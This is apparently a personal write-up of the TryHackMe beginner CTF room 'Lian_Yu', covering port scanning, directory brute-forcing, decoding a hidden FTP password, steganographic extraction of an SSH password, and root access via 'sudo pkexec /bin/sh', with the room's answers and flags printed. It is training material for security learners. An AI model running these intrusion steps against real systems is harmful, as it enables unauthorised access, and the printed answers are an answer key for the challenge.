<p align="center">November 7, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{185}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Lian-Yu &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}$$
</h1>
<p align="center">A beginner level security challenge.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/lianyu">Lian_Yu</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/ec7bc62a-da66-408c-b6ad-bfd417ebec6a">
  <img height="150px" src="https://github.com/user-attachments/assets/0861e55f-d736-40f0-a9df-2512c2b0924e">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Find the Flags](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Web Directory](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [File Name](#4) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [FTP Password](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp;[File Name with SSH Password](#6) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [User Flag](#7) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Root Flag](#8)  &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Room Complete](#9) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#10)

<br>
<br>
<br>
<h2>Task 1. Find the Flags<a id='1'></a></h2>

<br>
<p align="left">Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>
<br>

> 1.1. <em>Deploy the VM and Start the Enumeration.</em><br><a id='2'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<p>Ports 21, 22, 80 and 111 are open.</p>

<pre><code>~# nmap -A [Target_IP]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-07 03:31 GMT
Nmap scan report for ip-[Target_IP].eu-west-1.compute.internal ([Target_IP])
Host is up (0.00056s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          41474/udp  status
|_  100024  1          51531/tcp  status
MAC Address: 02:6D:E6:33:18:1F (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms ip-10-10-20-250.eu-west-1.compute.internal ([Target_IP])

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
</code></pre>

<br>
<p>Following its related services.</p>

<pre><code>~# nmap -sC -sV -vv  [Target_IP]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-07 03:53 GMT
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
...
PORT    STATE SERVICE REASON         VERSION
21/tcp  open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp  open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
...
80/tcp  open  http    syn-ack ttl 64 Apache httpd
...
111/tcp open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
...
</code></pre>

<br>
<p>I used the web browser to connect to port 80, and got the following page ...</p>

![image](https://github.com/user-attachments/assets/4595364e-dfc6-432e-9abf-439f950c697f)

<br>

<p>Running Gobuster I found <code>/island</code>.</p>

<pre><code>~#  gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://[Target_IP] -t 4 0 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target_IP]
[+] Method:                  GET
[+] Threads:                 4
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 2506]
/island               (Status: 301) [Size: 235] [--> http://[Target_IP]/island/]
/.html                (Status: 403) [Size: 199]
/server-status        (Status: 403) [Size: 199]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>

<p>Accessing <code>/island</code> and visualizing source code I found possible <code>credentials</code>.</p>

![image](https://github.com/user-attachments/assets/c91677f5-9353-4464-838b-07fd7c27e507)

![image](https://github.com/user-attachments/assets/fb90376a-ebaa-4d98-9c53-2cf1c11e71b6)

<br>
<br>

> 1.2. <em>What is the Web Directory you found?.</em><br><a id='3'></a>
>> <code><strong>2100</strong></code>

<br>

<p>Running Gobuster again, I found <code>/island/2100/</code>.</p>

<pre><code>~# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://[Target_IP]/island/ -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target_IP]/island/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 240] [--> http://[Target_IP]/island/2100/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>
<p>Accessing <code>[Target_IP]/island/2100/</code> and visualizeing source code, I got a clue: <code>.ticket</code>.</p>

![image](https://github.com/user-attachments/assets/1ed37425-5e0f-428b-9fe3-f83f41e3cde7)

![image](https://github.com/user-attachments/assets/8fe1db71-172a-4c2b-aac9-c45b342ecbd9)

<br>
<br>

> 1.3. <em>what is the file name you found?</em><br><a id='4'></a>
>> <code><strong>green_arrow.ticket</strong></code>

<p>Used Gobuster again and found <code>/island/2100/green_arrow.ticket/</code>.</p>

<pre><code>~# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://[Target_IP]/island/2100/ -t 40 -x ticket
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target_IP]/island/2100/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>
<br>

> 1.4. <em>what is the FTP Password?</em><br><a id='5'></a>
>> <code><strong>!#th3h00d</strong></code>

<br>
<p>And look what we found: a token to get into Queen´s Gambit(Ship).</p>

<pre><code>RTy8yhBQdscX
</code></pre>

![image](https://github.com/user-attachments/assets/04a32e90-0854-47b6-baae-5a24fc520858)

<br>
<p>Used CyBerChef to decode it.</p>

![image](https://github.com/user-attachments/assets/24208804-9ae1-4f53-8657-9b7e044d1bc5)

<pre><code>!#th3h00d
</code></pre>

<br>
<br>

> 1.5. <em>what is the file name with SSH password?</em><br><a id='6'></a>
>> <code><strong>shado</strong></code>

<br>

<pre><code>~# ftp [Target_IP]
Connected to [Target_IP].
220 (vsFTPd 3.0.2)
Name ([Target_IP]:root): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 0.00 secs (117.5371 MB/s)
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 0.01 secs (102.5114 MB/s)
  ftp> get .bash_history
local: .bash_history remote: .bash_history
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .bash_history (44 bytes).
226 Transfer complete.
44 bytes received in 0.00 secs (74.9891 kB/s)
ftp> get .other_user
local: .other_user remote: .other_user
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .other_user (2483 bytes).
226 Transfer complete.
2483 bytes received in 0.00 secs (4.3770 MB/s)
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 0.00 secs (52.1398 MB/s)
ftp> get .profile
local: .profile remote: .profile
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .profile (675 bytes).
226 Transfer complete.
675 bytes received in 0.00 secs (586.9810 kB/s)
ftp> get .bash_logout
local: .bash_logout remote: .bash_logout
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .bash_logout (220 bytes).
226 Transfer complete.
220 bytes received in 0.00 secs (330.0211 kB/s)
ftp> exit
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/baebb88d-4e42-41df-ad76-27e03d56d17a)

<br>

<h2>Queen's_Gambit.png</h2>

<pre><code>~# file "Queen's_Gambit.png"
Queen's_Gambit.png: PNG image data, 1280 x 720, 8-bit/color RGBA, non-interlaced
</code></pre>

<pre><code>>~# hexedit "Queen's_Gambit.png"
</code></pre>

![image](https://github.com/user-attachments/assets/b834e4e3-f7da-4dff-b8f0-815414fee3f4)

![image](https://github.com/user-attachments/assets/e2e38d0d-4c94-41df-ada0-fcc131191aac)

<br>

<h2>Leave_me_alone.png</h2>

<pre><code>>~# hexedit Leave_me_alone.png
</code></pre>

<p>Save the changes using <code>Ctrl+X</code>.</p>

![image](https://github.com/user-attachments/assets/87a89b19-ae46-4afe-a6eb-5f3b1123722a)

![image](https://github.com/user-attachments/assets/d7686f0e-5ce9-4106-87c6-e2b7855ccda6)

<br>

<h2>aa.jpg</h2>
<pre><code>~# file aa.jpg
aa.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x1600, frames 3
</code></pre>

![image](https://github.com/user-attachments/assets/5c015867-51b7-4ad5-8ad1-3df4b941f011)

<pre><code>~# steghide --extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
</code></pre>

<br>
<h2>ss.zip</h2>

<pre><code>~# unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado         
</code></pre>

<br>
<h2>passwd.txt</h2>

<pre><code>~# file passwd.txt
passwd.txt: ASCII text    
</code></pre>

<pre><code>~# cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
 
</code></pre>

<br>
<h2>shado</h2>

<pre><code>~# file shado
shado: Clarion Developer (v2 and above) memo data  
</code></pre>

<pre><code>~# cat shado
M3tahuman
</code></pre>

<br>

> 1.6. <em>user.txt</em><br><a id='7'></a>
>> <code><strong>THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}</strong></code>

<br>

![image](https://github.com/user-attachments/assets/b3a27219-99f7-4a7e-a547-21aad2855cf8)

<pre><code>slade@LianYu:~$ id
uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
slade@LianYu:~$ pwd
/home/slade
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

slade@LianYu:~$ 
</code></pre>

<br>

> 1.7. <em>root.txt</em><br><a id='8'></a>
>> <code><strong>THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}</strong></code>

<pre><code>slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$  
</code></pre>

<pre><code>slade@LianYu:~$ sudo pkexec /bin/sh
# whoami
root
# pwd
/root
# ls
root.txt
# cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

#
</code></pre>

<br>

<h2>Room Complete<a id='9'></a></h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/8404c893-20ed-4cf5-9017-bdf1a3afe718)

<h2>My Journey<a id='5'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| November 7, 2024  | 185      |       1,285ª |          28ª |      4,047ª |        58ª | 53,910   |       404 |

![image](https://github.com/user-attachments/assets/ac86b7ee-eca8-4d32-9daa-d43ac96f1eb0)

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
